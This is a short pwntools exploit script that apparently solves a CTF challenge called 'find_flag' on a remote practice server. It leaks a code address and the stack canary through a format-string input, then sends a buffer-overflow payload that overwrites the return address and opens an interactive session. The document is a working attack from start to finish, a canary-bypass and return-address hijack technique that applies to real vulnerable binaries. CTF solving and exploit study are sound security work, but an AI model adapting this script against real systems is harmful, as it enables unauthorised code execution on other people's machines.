from pwn import*
context.update(arch='amd64',os='linux')
context.terminal = ['qterminal','-e']
context.log_level = 'debug'
#p=process('./find_flag')
p=remote('node4.anna.nssctf.cn',28783)
p.recvuntil(b'name?')
p.sendline('%19$p%17$p')
p.recvuntil(b'0x')
next=int(p.recv(12),16)
p.recvuntil(b'0x')
canary=int(p.recvuntil(b'00'),16)
back=next-0x46F+0x22E
log.info("back = %#x" % (back))
log.info("canary = %#x" % (canary))
payload=b'a'*56+p64(canary)+b'a'*8+p64(back)
sleep(0.2)
p.sendline(payload)

p.interactive()